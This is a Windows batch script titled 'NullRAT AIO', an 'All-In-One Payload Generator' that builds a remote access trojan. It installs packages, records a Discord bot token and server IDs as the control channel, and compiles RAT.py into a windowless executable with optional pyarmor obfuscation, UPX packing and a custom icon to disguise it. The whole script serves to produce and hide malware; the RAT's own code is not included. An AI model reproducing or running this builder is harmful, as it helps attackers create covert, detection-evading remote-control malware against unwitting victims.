@echo off & @title NullRAT AIO 
chcp 65001 & cd "%~dp0NullRAT"
setlocal EnableDelayedExpansion
mode con: cols=80 lines=29

:main
cls & echo Press any key to start, C to clean working dir, E to exit:                                              

echo                                                                                 [0m
echo. & echo. & echo. & echo. & echo. & echo. & echo.        
echo            [38;2;0;220;255m███╗   ██╗██╗   ██╗██╗     ██╗     ██████╗  █████╗ ████████╗[38;2;255;255;255m
echo            [38;2;0;200;255m████╗  ██║██║   ██║██║     ██║     ██╔══██╗██╔══██╗╚══██╔══╝[38;2;255;255;255m
echo            [38;2;0;180;255m██╔██╗ ██║██║   ██║██║     ██║     ██████╔╝███████║   ██║[38;2;255;255;255m
echo            [38;2;0;160;255m██║╚██╗██║██║   ██║██║     ██║     ██╔══██╗██╔══██║   ██║[38;2;255;255;255m
echo            [38;2;0;140;255m██║ ╚████║╚██████╔╝███████╗███████╗██║  ██║██║  ██║   ██║[38;2;255;255;255m
echo            [38;2;0;120;255m╚═╝  ╚═══╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝[38;2;255;255;255m
echo.
echo                     [38;2;0;255;30m╔[38;2;255;255;255m[38;2;0;255;50m═[38;2;255;255;255m[38;2;0;255;70m═[38;2;255;255;255m[38;2;0;255;90m═[38;2;255;255;255m[38;2;0;255;110m═[38;2;255;255;255m[38;2;0;255;130m═[38;2;255;255;255m[38;2;0;255;150m═[38;2;255;255;255m[38;2;0;255;170m═[38;2;255;255;255m[38;2;0;255;190m═[38;2;255;255;255m[38;2;0;255;210m═[38;2;255;255;255m[38;2;0;255;230m═[38;2;255;255;255m[38;2;0;255;250m═[38;2;255;255;255m[38;2;0;255;220m═[38;2;255;255;255m[38;2;0;255;200m═[38;2;255;255;255m[38;2;0;255;180m═[38;2;255;255;255m[38;2;0;255;160m═[38;2;255;255;255m[38;2;0;255;140m═[38;2;255;255;255m[38;2;0;255;120m═[38;2;255;255;255m[38;2;0;255;100m═[38;2;255;255;255m[38;2;0;255;80m═[38;2;255;255;255m[38;2;0;255;60m═[38;2;255;255;255m[38;2;0;255;40m═[38;2;255;255;255m[38;2;0;255;20m═[38;2;255;255;255m[38;2;0;255;0m═[38;2;255;255;255m[38;2;0;255;30m═[38;2;255;255;255m[38;2;0;255;50m═[38;2;255;255;255m[38;2;0;255;70m═[38;2;255;255;255m[38;2;0;255;90m═[38;2;255;255;255m[38;2;0;255;110m═[38;2;255;255;255m[38;2;0;255;130m═[38;2;255;255;255m[38;2;0;255;150m═[38;2;255;255;255m[38;2;0;255;170m═[38;2;255;255;255m[38;2;0;255;190m═[38;2;255;255;255m[38;2;0;255;210m═[38;2;255;255;255m[38;2;0;255;230m═[38;2;255;255;255m[38;2;0;255;250m═[38;2;255;255;255m[38;2;0;255;220m═[38;2;255;255;255m[38;2;0;255;200m═[38;2;255;255;255m[38;2;0;255;180m═[38;2;255;255;255m[38;2;0;255;160m╗[38;2;255;255;255m
echo                     [38;2;0;255;30m║[38;2;255;255;255m [38;2;0;255;50m[38;2;255;255;255m[38;2;0;255;70m[0m[5m[38;2;125;225;126m^>^>^> All-In-One Payload Generator ^<^<^< [0m[38;2;0;255;180m[38;2;255;255;255m[38;2;0;255;160m║[38;2;255;255;255m
echo                     [38;2;0;255;30m╚[38;2;255;255;255m[38;2;0;255;50m═[38;2;255;255;255m[38;2;0;255;70m═[38;2;255;255;255m[38;2;0;255;90m═[38;2;255;255;255m[38;2;0;255;110m═[38;2;255;255;255m[38;2;0;255;130m═[38;2;255;255;255m[38;2;0;255;150m═[38;2;255;255;255m[38;2;0;255;170m═[38;2;255;255;255m[38;2;0;255;190m═[38;2;255;255;255m[38;2;0;255;210m═[38;2;255;255;255m[38;2;0;255;230m═[38;2;255;255;255m[38;2;0;255;250m═[38;2;255;255;255m[38;2;0;255;220m═[38;2;255;255;255m[38;2;0;255;200m═[38;2;255;255;255m[38;2;0;255;180m═[38;2;255;255;255m[38;2;0;255;160m═[38;2;255;255;255m[38;2;0;255;140m═[38;2;255;255;255m[38;2;0;255;120m═[38;2;255;255;255m[38;2;0;255;100m═[38;2;255;255;255m[38;2;0;255;80m═[38;2;255;255;255m[38;2;0;255;60m═[38;2;255;255;255m[38;2;0;255;40m═[38;2;255;255;255m[38;2;0;255;20m═[38;2;255;255;255m[38;2;0;255;0m═[38;2;255;255;255m[38;2;0;255;30m═[38;2;255;255;255m[38;2;0;255;50m═[38;2;255;255;255m[38;2;0;255;70m═[38;2;255;255;255m[38;2;0;255;90m═[38;2;255;255;255m[38;2;0;255;110m═[38;2;255;255;255m[38;2;0;255;130m═[38;2;255;255;255m[38;2;0;255;150m═[38;2;255;255;255m[38;2;0;255;170m═[38;2;255;255;255m[38;2;0;255;190m═[38;2;255;255;255m[38;2;0;255;210m═[38;2;255;255;255m[38;2;0;255;230m═[38;2;255;255;255m[38;2;0;255;250m═[38;2;255;255;255m[38;2;0;255;220m═[38;2;255;255;255m[38;2;0;255;200m═[38;2;255;255;255m[38;2;0;255;180m═[38;2;255;255;255m[38;2;0;255;160m╝[38;2;255;255;255m
echo [?25l
choice /c ECABDFGHIJKLMNOPQRSTUVWXYZ123456789 /n
if %errorlevel%==1 (exit /b 2) 
if %errorlevel%==2 (goto cleanup) else (goto depend)

:depend
@title NullRAT AIO (Dependencies Installer)
cls & echo.
echo        [38;2;0;220;255m██╗██╗     ██████╗ ███████╗██████╗ ██╗███╗   ██╗███████╗████████╗[38;2;255;255;255m
echo       [38;2;0;200;255m███║╚██╗    ██╔══██╗██╔════╝██╔══██╗██║████╗  ██║██╔════╝╚══██╔══╝[38;2;255;255;255m
echo       [38;2;0;180;255m╚██║ ██║    ██║  ██║█████╗  ██████╔╝██║██╔██╗ ██║███████╗   ██║[38;2;255;255;255m
echo        [38;2;0;160;255m██║ ██║    ██║  ██║██╔══╝  ██╔═══╝ ██║██║╚██╗██║╚════██║   ██║[38;2;255;255;255m
echo        [38;2;0;140;255m██║██╔╝    ██████╔╝███████╗██║     ██║██║ ╚████║███████║   ██║[38;2;255;255;255m
echo        [38;2;0;120;255m╚═╝╚═╝     ╚═════╝ ╚══════╝╚═╝     ╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝[38;2;255;255;255m                                         
echo ^>^> Would you like to install^/update NullRAT's Dependencies^? [Y^/N]
choice /c YN /n 
if %errorlevel%==2 (
	echo Skipping 
	goto vars
) else (
	cls & echo.
	echo        [38;2;0;220;255m██╗██╗     ██████╗ ███████╗██████╗ ██╗███╗   ██╗███████╗████████╗[38;2;255;255;255m
	echo       [38;2;0;200;255m███║╚██╗    ██╔══██╗██╔════╝██╔══██╗██║████╗  ██║██╔════╝╚══██╔══╝[38;2;255;255;255m
	echo       [38;2;0;180;255m╚██║ ██║    ██║  ██║█████╗  ██████╔╝██║██╔██╗ ██║███████╗   ██║[38;2;255;255;255m
	echo        [38;2;0;160;255m██║ ██║    ██║  ██║██╔══╝  ██╔═══╝ ██║██║╚██╗██║╚════██║   ██║[38;2;255;255;255m
	echo        [38;2;0;140;255m██║██╔╝    ██████╔╝███████╗██║     ██║██║ ╚████║███████║   ██║[38;2;255;255;255m
	echo        [38;2;0;120;255m╚═╝╚═╝     ╚═════╝ ╚══════╝╚═╝     ╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝[38;2;255;255;255m                                
	echo ^>^> Would you like to install^/update NullRAT's Dependencies^? [Y^/N] & echo.
	echo 1^> Installing fixed version of pyinstaller...
	start "" "python" -m pip install pyinstaller==4.10
	timeout /t 3 /nobreak >nul
	echo 2^> Uninstalling incompatible packages...
	start "" "python" -m pip uninstall enum34
	echo 3^> Installing/Upgrading rest of dependencies...
	start "" "python" -m pip install --upgrade virtualenv aiohttp disnake requests mss pyarmor 
	timeout /t 6 /nobreak >nul
	start "" "python" -m pip install --upgrade virtualenv aiohttp disnake requests mss pyarmor
	echo.
	echo ALL DONE!
	timeout /t 5 
	goto vars
)

:vars
mode con: cols=90 lines=30
@title NullRAT AIO (Variables Setter)
cd "%~dp0NullRAT"
cls & echo.
echo    [38;2;0;220;255m██████╗ ██╗     ██╗   ██╗ █████╗ ██████╗ ██╗ █████╗ ██████╗ ██╗     ███████╗███████╗[38;2;255;255;255m
echo    [38;2;0;200;255m╚════██╗╚██╗    ██║   ██║██╔══██╗██╔══██╗██║██╔══██╗██╔══██╗██║     ██╔════╝██╔════╝[38;2;255;255;255m
echo     [38;2;0;180;255m█████╔╝ ██║    ██║   ██║███████║██████╔╝██║███████║██████╔╝██║     █████╗  ███████╗[38;2;255;255;255m
echo    [38;2;0;160;255m██╔═══╝  ██║    ╚██╗ ██╔╝██╔══██║██╔══██╗██║██╔══██║██╔══██╗██║     ██╔══╝  ╚════██║[38;2;255;255;255m
echo    [38;2;0;140;255m███████╗██╔╝     ╚████╔╝ ██║  ██║██║  ██║██║██║  ██║██████╔╝███████╗███████╗███████║[38;2;255;255;255m
echo    [38;2;0;120;255m╚══════╝╚═╝       ╚═══╝  ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚═════╝ ╚══════╝╚══════╝╚══════╝[38;2;255;255;255m
IF EXIST "Variables.py" (goto fileE) else (goto a)

:fileE
echo.
echo A pre-existing variables file was detected.
choice /c YN /n /m "Do you want to check its contents? [Y/N]"
if %errorlevel%==2 (
	cls & echo.
	echo    [38;2;0;220;255m██████╗ ██╗     ██╗   ██╗ █████╗ ██████╗ ██╗ █████╗ ██████╗ ██╗     ███████╗███████╗[38;2;255;255;255m
	echo    [38;2;0;200;255m╚════██╗╚██╗    ██║   ██║██╔══██╗██╔══██╗██║██╔══██╗██╔══██╗██║     ██╔════╝██╔════╝[38;2;255;255;255m
	echo     [38;2;0;180;255m█████╔╝ ██║    ██║   ██║███████║██████╔╝██║███████║██████╔╝██║     █████╗  ███████╗[38;2;255;255;255m
	echo    [38;2;0;160;255m██╔═══╝  ██║    ╚██╗ ██╔╝██╔══██║██╔══██╗██║██╔══██║██╔══██╗██║     ██╔══╝  ╚════██║[38;2;255;255;255m
	echo    [38;2;0;140;255m███████╗██╔╝     ╚████╔╝ ██║  ██║██║  ██║██║██║  ██║██████╔╝███████╗███████╗███████║[38;2;255;255;255m
	echo    [38;2;0;120;255m╚══════╝╚═╝       ╚═══╝  ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚═════╝ ╚══════╝╚══════╝╚══════╝[38;2;255;255;255m
	echo.
	goto a
)

if %errorlevel%==1 (goto endd)

:a
echo.
echo Obtaining information for Variables.py ...
echo ==========================================
echo.
set /p "token=Enter Bot Token: "
if "%token%"=="" (cls & echo [ERROR] Token cannot be empty! & goto createF)
set /p "notification=Enter Notification ID: "
if "%notification%"=="" (cls & echo [ERROR] Notification cannot be empty! & goto createF)
set /p "server=Enter Server ID: "
if "%server%"=="" (cls & echo [ERROR] Server cannot be empty! & goto createF)

echo ^# This file was auto-generated by NullRAT Variables^. DO NOT SHARE^! > Variables.py
echo bot_token = ^"%token%^" >> Variables.py
echo notification_channel = %notification% >> Variables.py
echo server_ids = ^[%server%^] >> Variables.py

echo. & echo Variables file successfully created!
timeout /t 3
goto compiler

:endd
echo. & type Variables.py & echo.
choice /c YN /n /m "Are all these information correct? [Y/N]"
if %errorlevel%==2 (
	cls & echo.
	echo    [38;2;0;220;255m██████╗ ██╗     ██╗   ██╗ █████╗ ██████╗ ██╗ █████╗ ██████╗ ██╗     ███████╗███████╗[38;2;255;255;255m
	echo    [38;2;0;200;255m╚════██╗╚██╗    ██║   ██║██╔══██╗██╔══██╗██║██╔══██╗██╔══██╗██║     ██╔════╝██╔════╝[38;2;255;255;255m
	echo     [38;2;0;180;255m█████╔╝ ██║    ██║   ██║███████║██████╔╝██║███████║██████╔╝██║     █████╗  ███████╗[38;2;255;255;255m
	echo    [38;2;0;160;255m██╔═══╝  ██║    ╚██╗ ██╔╝██╔══██║██╔══██╗██║██╔══██║██╔══██╗██║     ██╔══╝  ╚════██║[38;2;255;255;255m
	echo    [38;2;0;140;255m███████╗██╔╝     ╚████╔╝ ██║  ██║██║  ██║██║██║  ██║██████╔╝███████╗███████╗███████║[38;2;255;255;255m
	echo    [38;2;0;120;255m╚══════╝╚═╝       ╚═══╝  ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚═════╝ ╚══════╝╚══════╝╚══════╝[38;2;255;255;255m
	echo.
	goto a
)
if %errorlevel%==1 (	
	echo. & echo [38;2;0;120;255mThe following information is correct.[38;2;255;255;255m
	timeout /t 2 & goto compiler
)

:a
echo.
echo Obtaining information for Variables.py ...
echo ==========================================
echo.
set /p "token=Enter Bot Token: "
if "%token%"=="" (cls & echo [ERROR] Token cannot be empty! & goto createF)
set /p "notification=Enter Notification ID: "
if "%notification%"=="" (cls & echo [ERROR] Notification cannot be empty! & goto createF)
set /p "server=Enter Server ID: "
if "%server%"=="" (cls & echo [ERROR] Server cannot be empty! & goto createF)

cd "%~dp0NullRAT"
echo ^# This file was auto-generated by NullRAT Variables^. DO NOT SHARE^! > Variables.py
echo bot_token = ^"%token%^" >> Variables.py
echo notification_channel = %notification% >> Variables.py
echo server_ids = ^[%server%^] >> Variables.py

echo. &echo Variables file successfully created!
timeout /t 3
goto compiler

:compiler
@title NullRAT AIO (Compiler)
cls & echo.
echo      [38;2;0;220;255m██████╗ ██╗      ██████╗ ██████╗ ███╗   ███╗██████╗ ██╗██╗     ███████╗██████╗[38;2;255;255;255m
echo      [38;2;0;200;255m╚════██╗╚██╗    ██╔════╝██╔═══██╗████╗ ████║██╔══██╗██║██║     ██╔════╝██╔══██╗[38;2;255;255;255m
echo       [38;2;0;180;255m█████╔╝ ██║    ██║     ██║   ██║██╔████╔██║██████╔╝██║██║     █████╗  ██████╔╝[38;2;255;255;255m
echo       [38;2;0;160;255m╚═══██╗ ██║    ██║     ██║   ██║██║╚██╔╝██║██╔═══╝ ██║██║     ██╔══╝  ██╔══██╗[38;2;255;255;255m
echo      [38;2;0;140;255m██████╔╝██╔╝    ╚██████╗╚██████╔╝██║ ╚═╝ ██║██║     ██║███████╗███████╗██║  ██║[38;2;255;255;255m
echo      [38;2;0;120;255m╚═════╝ ╚═╝      ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝[38;2;255;255;255m
echo.
echo [0;36m^>^> Options:
echo -----------[0m
echo.

choice /c YN /n /m "Do you want to obfuscate the executable? [Y/N]: "
if %errorlevel%==1 (set pyarmor=yes) 
if %errorlevel%==2 (set pyarmor=no)

choice /c YN /n /m "Do you want to compress the executable? [Y/N]: "
if %errorlevel%==1 (set upxdd=yes)
if %errorlevel%==2 (set upxdd=no)

choice /c YN /n /m "Do you want to add a custom icon? [Y/N]: "
if %errorlevel%==1 (set icon=yes) 
if %errorlevel%==2 (set icon=no)

echo.
echo [0;36mAll options selected:
echo --------------------------------------------[0m
echo Obfuscating the executable="%pyarmor%"
echo Compressing the executable="%upxdd%"
echo Adding a custom icon to the executable="%icon%"
echo [0;36m--------------------------------------------[0m

echo. & choice /c YN /n /m "Are all these options correct? [Y/N]: "
if %errorlevel%==2 (goto compiler) else (goto compile)

:compile
cls & echo.
echo      [38;2;0;220;255m██████╗ ██╗      ██████╗ ██████╗ ███╗   ███╗██████╗ ██╗██╗     ███████╗██████╗[38;2;255;255;255m
echo      [38;2;0;200;255m╚════██╗╚██╗    ██╔════╝██╔═══██╗████╗ ████║██╔══██╗██║██║     ██╔════╝██╔══██╗[38;2;255;255;255m
echo       [38;2;0;180;255m█████╔╝ ██║    ██║     ██║   ██║██╔████╔██║██████╔╝██║██║     █████╗  ██████╔╝[38;2;255;255;255m
echo       [38;2;0;160;255m╚═══██╗ ██║    ██║     ██║   ██║██║╚██╔╝██║██╔═══╝ ██║██║     ██╔══╝  ██╔══██╗[38;2;255;255;255m
echo      [38;2;0;140;255m██████╔╝██╔╝    ╚██████╗╚██████╔╝██║ ╚═╝ ██║██║     ██║███████╗███████╗██║  ██║[38;2;255;255;255m
echo      [38;2;0;120;255m╚═════╝ ╚═╝      ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝[38;2;255;255;255m
echo.

if "!icon!"=="yes" (
	set /P "iconP=Please type the path of the custom icon: " 
	move "!iconP!" "%~dp0\NullRAT\custom_icon.ico"
)
if "!upxdd!"=="yes" (set "path=!path!;%~dp0\NullRAT\upx;%~dp0\upx")

cd "%~dp0"
set "folder=compiling-%random%"
mkdir "!folder!" & cd "NullRAT"
copy *.* ..\"!folder!"
copy "modules\*.*" ..\"!folder!"

cd modules

set "main_arg=pyinstaller --onefile --noconsole --icon=custom_icon.ico --hidden-import mss"
set "main_arg3=pyarmor pack --clean -e " --onefile --noconsole --icon=custom_icon.ico --hidden-import mss"

set "main_arg2=pyinstaller --onefile --noconsole --hidden-import mss"
set "main_arg4=pyarmor pack -e " --onefile --noconsole --hidden-import mss"

for %%i in (*) do set "main_arg=!main_arg! --add-data %%~nxi;."
for %%i in (*) do set "main_arg2=!main_arg2! --add-data %%~nxi;."
for %%i in (*) do set "main_arg3=!main_arg3! --add-data %%~nxi;."
for %%i in (*) do set "main_arg4=!main_arg4! --add-data %%~nxi;."

set "main_arg=!main_arg! RAT.py"
set "main_arg2=!main_arg2! RAT.py"
set "main_arg3=!main_arg3! " RAT.py"
set "main_arg4=!main_arg4! " RAT.py"

cd "%~dp0!folder!"

if "!pyarmor!"=="yes" (
	if "!icon!"=="yes" (
		!main_arg3!
	) else (
		!main_arg4!
	)
) else (
	if "!icon!"=="yes" (
		!main_arg!
	) else (
		!main_arg2!
	)
)

move dist\RAT.exe "%~dp0\" & echo.
cd "%~dp0\"
rmdir /s /q "!folder!"
timeout /t 2

exit

:cleanup
cd "%~dp0"
if exist "NullRAT\" (
	move NullRAT\custom_icon.ico "%~dp0"
	move NullRAT\RAT.py "%~dp0"
	move NullRAT\modules "%~dp0"
	move NullRAT\upx\upx.exe "%~dp0"
	rmdir /s /q NullRAT
)
attrib -h ".git"
del README.md
del "Getting Variables".md
del .gitignore
if exist RAT.exe (del RAT.exe)
rmdir /s /q ".git"
rmdir /s /q "build"
rmdir /s /q "dist"

mkdir NullRAT
move custom_icon.ico "%~dp0\NullRAT"
move RAT.py "%~dp0\NullRAT"
move modules "%~dp0\NullRAT"
mkdir NullRAT\upx
move upx.exe "%~dp0\NullRAT\upx"

goto main
